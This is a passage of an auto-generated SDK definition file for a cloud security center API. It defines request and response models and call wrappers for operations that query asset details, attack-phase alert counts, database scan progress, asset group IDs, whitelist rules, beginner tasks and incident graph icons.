      machineIpType?: string(name='MachineIpType', description='The type of the IP address for the server. Valid values include the following values:

*   **ecs**: the IP address of the Elastic Compute Service (ECS) instance.
*   **slb**: the IP address of the Server Load Balancer (SLB) instance.', example='SLB'),
      machineName?: string(name='MachineName', description='The name of the server.', example='security'),
      machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='cn-hangzhou'),
      machineType?: string(name='MachineType', description='The instance type of the server. Valid values include the following values:

*   **ecs**
*   **slb**', example='ecs'),
      online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid values:

*   **true**
*   **false**', example='true'),
      os?: string(name='Os', description='The operating system of the server.', example='linux'),
      osName?: string(name='OsName', description='The name of the operating system for the server.', example='Debian  10.3 64'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      status?: string(name='Status', description='The status of the server. Valid values include the following values:

*   **Running**
*   **Waiting**', example='Running'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  timeCost?: long(name='TimeCost', description='The consumed time of the request. Unit: seconds.', example='1'),
}

model QueryAssetDetailByUUIDResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryAssetDetailByUUIDResponseBody(name='body'),
}

/**
 * @summary Queries the details of assets by using asset UUIDs. Cross-account query is supported.
 *
 * @param request QueryAssetDetailByUUIDRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryAssetDetailByUUIDResponse
 */
async function queryAssetDetailByUUIDWithOptions(request: QueryAssetDetailByUUIDRequest, runtime: Util.RuntimeOptions): QueryAssetDetailByUUIDResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.requests)) {
    body['Requests'] = request.requests;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryAssetDetailByUUID',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of assets by using asset UUIDs. Cross-account query is supported.
 *
 * @param request QueryAssetDetailByUUIDRequest
 * @return QueryAssetDetailByUUIDResponse
 */
async function queryAssetDetailByUUID(request: QueryAssetDetailByUUIDRequest): QueryAssetDetailByUUIDResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryAssetDetailByUUIDWithOptions(request, runtime);
}

model QueryAttackCountRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='175.0.XX.XX'),
  uuids?: string(name='Uuids', description='The UUID of the asset.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of assets.', example='0c1714dc-f7a3-4265-8364-7aa3fce8****,1cc45e7d-7698-4b2c-89d8-e8cba407****'),
}

model QueryAttackCountResponseBody = {
  code?: string(name='Code', description='The HTTP status code returned.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='0'),
  data?: [ 
    {
      eventCount?: int32(name='EventCount', description='The number of times that the alert is triggered.', example='28'),
      tacticId?: string(name='TacticId', description='The stage ID of the ATT\\\\&CK attack.', example='TA0043'),
      tacticType?: string(name='TacticType', description='The type of stage of the ATT\\\\&CK attack.', example='Data collection'),
    }
  ](name='Data', description='An array that consists of the numbers of alert events in different attack phases.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D4BE7D77-5B02-5126-A684-A73F6CD3XXXX'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model QueryAttackCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryAttackCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of alert events in each attack phase.
 *
 * @param request QueryAttackCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryAttackCountResponse
 */
async function queryAttackCountWithOptions(request: QueryAttackCountRequest, runtime: Util.RuntimeOptions): QueryAttackCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryAttackCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of alert events in each attack phase.
 *
 * @param request QueryAttackCountRequest
 * @return QueryAttackCountResponse
 */
async function queryAttackCount(request: QueryAttackCountRequest): QueryAttackCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryAttackCountWithOptions(request, runtime);
}

model QueryDiscoverDatabaseRequest {
  createMark?: string(name='CreateMark', description='The ID of the scan task.

> You can call the [StartDiscoverDatabaseTask](~~StartDiscoverDatabaseTask~~) operation to query the ID of the task.', example='7f7b051f-7d1c-46da-b253-a03f3a27****'),
}

model QueryDiscoverDatabaseResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
  taskProgress?: int32(name='TaskProgress', description='The progress of the database scan task in percentage.', example='90'),
}

model QueryDiscoverDatabaseResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryDiscoverDatabaseResponseBody(name='body'),
}

/**
 * @summary Queries the progress of a database scan task.
 *
 * @param request QueryDiscoverDatabaseRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryDiscoverDatabaseResponse
 */
async function queryDiscoverDatabaseWithOptions(request: QueryDiscoverDatabaseRequest, runtime: Util.RuntimeOptions): QueryDiscoverDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.createMark)) {
    query['CreateMark'] = request.createMark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryDiscoverDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the progress of a database scan task.
 *
 * @param request QueryDiscoverDatabaseRequest
 * @return QueryDiscoverDatabaseResponse
 */
async function queryDiscoverDatabase(request: QueryDiscoverDatabaseRequest): QueryDiscoverDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryDiscoverDatabaseWithOptions(request, runtime);
}

model QueryGroupIdByGroupNameRequest {
  groupName?: string(name='GroupName', description='The name of the asset group.

This parameter is required.', example='TestGroupName'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
}

model QueryGroupIdByGroupNameResponseBody = {
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='9935302'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model QueryGroupIdByGroupNameResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryGroupIdByGroupNameResponseBody(name='body'),
}

/**
 * @summary Queries the ID of an asset group by using the name of the asset group.
 *
 * @description You can call the QueryGroupIdByGroupName operation to query the ID of an asset group to which your assets belong by using the name of the asset group. When you call operations such as [GetSuspiciousStatistics](~~GetSuspiciousStatistics~~) and [DeleteGroup](~~DeleteGroup~~), you must specify the ID of the asset group. To query the ID of an asset group, call the QueryGroupIdByGroupName operation.
 * ### Limits
 * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
 *
 * @param request QueryGroupIdByGroupNameRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryGroupIdByGroupNameResponse
 */
async function queryGroupIdByGroupNameWithOptions(request: QueryGroupIdByGroupNameRequest, runtime: Util.RuntimeOptions): QueryGroupIdByGroupNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupIdByGroupName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the ID of an asset group by using the name of the asset group.
 *
 * @description You can call the QueryGroupIdByGroupName operation to query the ID of an asset group to which your assets belong by using the name of the asset group. When you call operations such as [GetSuspiciousStatistics](~~GetSuspiciousStatistics~~) and [DeleteGroup](~~DeleteGroup~~), you must specify the ID of the asset group. To query the ID of an asset group, call the QueryGroupIdByGroupName operation.
 * ### Limits
 * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
 *
 * @param request QueryGroupIdByGroupNameRequest
 * @return QueryGroupIdByGroupNameResponse
 */
async function queryGroupIdByGroupName(request: QueryGroupIdByGroupNameRequest): QueryGroupIdByGroupNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupIdByGroupNameWithOptions(request, runtime);
}

model QueryGroupedSecurityEventMarkMissListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  disposalWay?: string(name='DisposalWay', description='The handling method. Valid values:

*   **1**: Automatically Added to Whitelist
*   **2**: Defense Without Notification', example='1'),
  eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  remark?: string(name='Remark', description='The condition that is used to query alert events by asset. You can specify a value of the following types:

*   The IP address of the asset.
*   The public IP address of the asset.
*   The private IP address of the asset.
*   The name of the asset.', example='222.185.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.66.XX.XX'),
}

model QueryGroupedSecurityEventMarkMissListResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  list?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='31412647'),
      disposalWay?: string(name='DisposalWay', description='The handling method. Valid values:

*   **auto_add_white**: Automatically Added to Whitelist
*   **defense_not_notification**: Defense Without Notification', example='auto_add_white'),
      eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
      eventNameOriginal?: string(name='EventNameOriginal', description='The name of the alert event. The value indicates a type.', example='login_common_location'),
      eventType?: string(name='EventType', description='The subtype of the alert event.', example='Unusual Logon'),
      eventTypeOriginal?: string(name='EventTypeOriginal', description='The type of the alert event.', example='Unusual logon'),
      field?: string(name='Field', description='The field that is used in the whitelist rule.', example='type'),
      fieldValue?: string(name='FieldValue', description='The value of the field.', example='root'),
      filedAliasName?: string(name='FiledAliasName', description='The alias of the field.', example='Logon Time'),
      operate?: string(name='Operate', description='The operator. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **strEqual**: equals
*   **strNotEqual**: does not equal
*   **regex**: regular expression', example='contains'),
      uuids?: string(name='Uuids', description='The UUIDs of assets. Multiple UUIDs are separated by commas (,).', example='6985b88c-eb19-4d27-98ad-e4a42312****,5721d503-9b04-4243-89ca-1fb8ca5e****,db2678c3-10e3-4a20-92f1-265f6****'),
    }
  ](name='List', description='An array that consists of the whitelist rules.'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='965F9282-D403-4FA2-B1B9-10F62DC719BF'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model QueryGroupedSecurityEventMarkMissListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryGroupedSecurityEventMarkMissListResponseBody(name='body'),
}

/**
 * @summary Queries whitelist rules.
 *
 * @param request QueryGroupedSecurityEventMarkMissListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryGroupedSecurityEventMarkMissListResponse
 */
async function queryGroupedSecurityEventMarkMissListWithOptions(request: QueryGroupedSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): QueryGroupedSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.disposalWay)) {
    query['DisposalWay'] = request.disposalWay;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventName)) {
    body['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    body['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupedSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries whitelist rules.
 *
 * @param request QueryGroupedSecurityEventMarkMissListRequest
 * @return QueryGroupedSecurityEventMarkMissListResponse
 */
async function queryGroupedSecurityEventMarkMissList(request: QueryGroupedSecurityEventMarkMissListRequest): QueryGroupedSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupedSecurityEventMarkMissListWithOptions(request, runtime);
}

model QueryGuidTaskListResponseBody = {
  guideTaskConfigList?: [ 
    {
      rewardData?: {
        isRewardTaked?: string(name='IsRewardTaked', description='Indicates whether the reward is claimed. Valid values:

*   **1**: no.
*   **2**: yes.', example='1'),
        reward?: string(name='Reward', description='The name of the reward. Valid values:

*   **addTrialDay**: the days of trial use.
*   **addAntiRansomwareCapacity**: the anti-ransomware capacity.
*   **addImageScanAuthCount**: the quota for container image scan.
*   **addWebLockAuthCount**: the quota for web tamper proofing.
*   **addSlsCapacity**: the log storage capacity.', example='addWebLockAuthCount'),
        rewardConfig?: string(name='RewardConfig', description='The reward configuration. The value of this parameter is in the JSON format.

>  The key indicates the reward type, and the value indicates the number of rewards. Valid values of key:

*   **webLockAuthCount**: the quota for web tamper proofing.
*   **webLockAuthCount**: the anti-ransomware capacity. Unit: GB.
*   **slsCapacity**: the log storage capacity. Unit: GB.
*   **days**: the days of trial use.
*   **imageScanAuthCount**: the quota for container image scan.
*   **honeypotAuthCount**: the quota for cloud honeypot.', example='{"days":60,"ransomwareCapacity":100}'),
      }(name='RewardData', description='The information about the reward for a complete task.'),
      securityScore?: int32(name='SecurityScore', description='The security score that is increased after you complete the task.', example='80'),
      status?: int32(name='Status', description='The status of the beginner task. Valid values:

*   **0**: disabled.
*   **1**: in progress.
*   **2**: complete.', example='0'),
      taskId?: int32(name='TaskId', description='The ID of the beginner task.', example='t-000d8slfgx4p40kb64ad'),
      taskTypeName?: string(name='TaskTypeName', description='The name of the task type. Valid values:

*   **guid_task_security_score_promote_video**: the task of viewing a video tutorial for beginners.
*   **guide_sub_task_config_defence_hbr**: the task of configuring anti-ransomware for servers.
*   **guide_sub_task_config_uni_defence_hbr**: the task of configuring anti-ransomware for databases.
*   **guid_task_log_analysis_config**: the task of configuring log analysis.
*   **guide_sub_task_web_lock_config**: the task of configuring web tamper proofing.
*   **guide_sub_task_config_anti_crack**: the task of configuring protection against brute-force attacks.
*   **guid_task_container_security_video**: the task of viewing the video on how to protect containers.
*   **guid_task_container_image_scan_config**: the task of configuring container image scan.
*   **guid_task_k8s_log_analysis_config**: the task of configuring threat detection on Kubernetes containers.
*   **guid_task_container_network**: the task of configuring container network visualization.
*   **guide_sub_task_config_add_collection**: the task of saving a console URL.
*   **guide_sub_task_vul_scan**: the task of scanning for vulnerabilities.
*   **guide_sub_task_virusKill**: the task of configuring virus detection and removal.', example='guide_sub_task_config_add_collection'),
    }
  ](name='GuideTaskConfigList', description='The list of beginner tasks.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447D****'),
}

model QueryGuidTaskListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryGuidTaskListResponseBody(name='body'),
}

/**
 * @summary Queries the list of beginner tasks. Security Center provides rewards for users who complete tasks. The rewards include the quota for a value-added feature and log storage capacity.
 *
 * @param request QueryGuidTaskListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryGuidTaskListResponse
 */
async function queryGuidTaskListWithOptions(runtime: Util.RuntimeOptions): QueryGuidTaskListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'QueryGuidTaskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the list of beginner tasks. Security Center provides rewards for users who complete tasks. The rewards include the quota for a value-added feature and log storage capacity.
 *
 * @return QueryGuidTaskListResponse
 */
async function queryGuidTaskList(): QueryGuidTaskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGuidTaskListWithOptions(runtime);
}

model QueryIncidentIconListResponseBody = {
  code?: string(name='Code', description='The response code. Valid values:

*   **200**: The request was successful.
*   **400**: The request failed.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  infoList?: {
    entityTypeList?: [ 
      {
        displayColor?: string(name='DisplayColor', description='The display color of the entity.', example='#fff'),
        displayIcon?: string(name='DisplayIcon', description='The icon that corresponds to the entity.', example='https://img.alicdn.com/imgextra/i4/O1CN011BZBvK1oifgsWIXoO_!!60000*****-55-tps-32-32.svg'),
        displayOrder?: string(name='DisplayOrder', description='The display sequence of the entity.', example='5'),
        displayTemplate?: string(name='DisplayTemplate', description='The display template of the entity.', example='[{&quot;name&quot;:&quot;${sas.trace2.name.logtime}&quot;,&quot;value&quot;:&quot;$!{time}&quot;},{&quot;name&quot;:&quot;${sas.trace2.name.node_type}&quot;,&quot;value&quot;:&quot;${sas.trace2.name.ip}&quot;},{&quot;name&quot;:&quot;${sas.trace2.property.name}&quot;,&quot;value&quot;:&quot;$!{name}&quot;}#if($p_log_time),{&quot;name&quot;:&quot;${sas.trace2.property.log_time}&quot;,&quot;value&quot;:&quot;$!{p_log_time}&quot;}#end#if($p_pid),{&quot;name&quot;:&quot;${sas.trace2.property.pid}&quot;,&quot;value&quot;:&quot;$!{p_pid}&quot;}#end#if($p_procname),{&quot;name&quot;:&quot;${sas.trace2.property.procname}&quot;,&quot;value&quot;:&quot;$!{p_procname}&quot;}#end#if($p_proc_path),{&quot;name&quot;:&quot;${sas.trace2.property.proc_path}&quot;,&quot;value&quot;:&quot;$!{p_proc_path}&quot;}#end#if($p_cmdline),{&quot;name&quot;:&quot;${sas.trace2.property.cmdline}&quot;,&quot;value&quot;:&quot;$!{p_cmdline}&quot;}#end#if($p_username),{&quot;name&quot;:&quot;${sas.trace2.property.username}&quot;,&quot;value&quot;:&quot;$!{p_username}&quot;}#end#if($p_cwd),{&quot;name&quot;:&quot;${sas.trace2.property.cwd}&quot;,&quot;value&quot;:&quot;$!{p_cwd}&quot;}#end#if($p_filepath),{&quot;name&quot;:&quot;${sas.trace2.property.filepath}&quot;,&quot;value&quot;:&quot;$!{p_filepath}&quot;}#end#if($p_md5),{&quot;name&quot;:&quot;${sas.trace2.property.md5}&quot;,&quot;value&quot;:&quot;$!{p_md5}&quot;}#end#if($p_ctime),{&quot;name&quot;:&quot;${sas.trace2.property.ctime}&quot;,&quot;value&quot;:&quot;$!{p_ctime}&quot;}#end#if($p_mtime),{&quot;name&quot;:&quot;${sas.trace2.property.mtime}&quot;,&quot;value&quot;:&quot;$!{p_mtime}&quot;}#end#if($p_size),{&quot;name&quot;:&quot;${sas.trace2.property.size}&quot;,&quot;value&quot;:&quot;$!{p_size}&quot;}#end#if($p_port),{&quot;name&quot;:&quot;${sas.trace2.property.port}&quot;,&quot;value&quot;:&quot;$!{p_port}&quot;}#end#if($p_ip),{&quot;name&quot;:&quot;${sas.trace2.property.ip}&quot;,&quot;value&quot;:&quot;$!{p_ip}&quot;}#end#if($p_src_ip),{&quot;name&quot;:&quot;${sas.trace2.property.src_ip}&quot;,&quot;value&quot;:&quot;$!{p_src_ip}&quot;}#end#if($p_dst_ip),{&quot;name&quot;:&quot;${sas.trace2.property.dst_ip}&quot;,&quot;value&quot;:&quot;$!{p_dst_ip}&quot;}#end#if($p_host),{&quot;name&quot;:&quot;${sas.trace2.property.host}&quot;,&quot;value&quot;:&quot;$!{p_host}&quot;}#end#if($p_uri),{&quot;name&quot;:&quot;${sas.trace2.property.uri}&quot;,&quot;value&quot;:&quot;$!{p_uri}&quot;}#end#if($p_post_data),{&quot;name&quot;:&quot;${sas.trace2.property.post_data}&quot;,&quot;value&quot;:&quot;$!{p_post_data}&quot;}#end#if($p_content),{&quot;name&quot;:&quot;${sas.trace2.property.content}&quot;,&quot;value&quot;:&quot;$!{p_content}&quot;}#end#if($p_type),{&quot;name&quot;:&quot;${sas.trace2.property.type}&quot;,&quot;value&quot;:&quot;$!{p_type}&quot;}#end]",'),
        gmtCreate?: string(name='GmtCreate', description='The time when the entity was created.', example='2022-12-08T15:27Z'),
        gmtModified?: string(name='GmtModified', description='The time when the entity was updated.', example='2022-01-11T10:16Z'),
        id?: string(name='Id', description='The ID of the entity.', example='8038****'),
        isVirtualNode?: string(name='IsVirtualNode', description='Indicates whether the entity is a virtual node. Valid values:

*   **1**: yes
*   **0**: no', example='0'),
        name?: string(name='Name', description='The name of the entity.', example='shujuku'),
        namespace?: string(name='Namespace', description='The namespace of the entity.', example='kube-system'),
        traceSuccessFlag?: string(name='TraceSuccessFlag', description='The tag that indicates whether tracing was successful.', example='1'),
      }
    ](name='EntityTypeList', description='The information about the entities.'),
    relationTypeList?: [ 
      {
        directed?: string(name='Directed', description='The direction of the edge. Valid values:

*   **1**: forward
*   **0**: reverse', example='1'),
        displayColor?: string(name='DisplayColor', description='The display color of the edge.', example='#FFF'),
        displayIcon?: string(name='DisplayIcon', description='The icon that corresponds to the edge.', example='https://img.alicdn.com/imgextra/i4/O1CN01ft6rvQ22uUX2JsTmv_!!600000******-55-tps-12-12.svg'),
        displayTemplate?: string(name='DisplayTemplate', description='The display template of the edge.', example='test_template'),
        gmtCreate?: string(name='GmtCreate', description='The time when the edge was created.', example='167660031*****'),
        gmtModified?: string(name='GmtModified', description='The time when the edge was modified.', example='2023-01-04T17:35Z'),
        id?: string(name='Id', description='The ID of the edge.', example='4556****'),
        name?: string(name='Name', description='The name of the edge.', example='policy-auto-effs3b'),
        namespace?: string(name='Namespace', description='The namespace of the edge.', example='lkl-zf-bs-lams'),
        showType?: string(name='ShowType', description='The display type of the edge.', example='0'),
      }
    ](name='RelationTypeList', description='The information about the edges.'),
  }(name='InfoList', description='The information about the entities and edges.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  timeCost?: long(name='TimeCost', description='The consumed time of the request. Unit: seconds.', example='1'),
}

model QueryIncidentIconListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryIncidentIconListResponseBody(name='body'),
}

/**
 * @summary Queries the icons that correspond to nodes and edges.
 *
 * @param request QueryIncidentIconListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryIncidentIconListResponse
 */
async function queryIncidentIconListWithOptions(runtime: Util.RuntimeOptions): QueryIncidentIconListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'QueryIncidentIconList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the icons that correspond to nodes and edges.
 *
 * @return QueryIncidentIconListResponse
 */
async function queryIncidentIconList(): QueryIncidentIconListResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryIncidentIconListWithOptions(runtime);
}

model QueryIncidentSubNodesCountRequest {
  body?: string(name='body', description='The request parameters.', example='{"body": {"VertexIdAndTypeList": [["b17f3a9a1a6abd6a6786208492e71912", "process"], ["58fa3749cd7ce20f7e75424070012ed9", "file"]]}}'),
}

model QueryIncidentSubNodesCountResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  subNodesCount?: map[string]int32(name='SubNodesCount', description='The child nodes.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful.', example='True'),
}

model QueryIncidentSubNodesCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryIncidentSubNodesCountResponseBody(name='body'),
}

/**
 * @summary Queries whether a node can be drilled down.
 *
 * @param request QueryIncidentSubNodesCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryIncidentSubNodesCountResponse
 */
async function queryIncidentSubNodesCountWithOptions(request: QueryIncidentSubNodesCountRequest, runtime: Util.RuntimeOptions): QueryIncidentSubNodesCountResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.body)) {
    body['body'] = request.body;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryIncidentSubNodesCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries whether a node can be drilled down.
 *
 * @param request QueryIncidentSubNodesCountRequest
 * @return QueryIncidentSubNodesCountResponse
 */
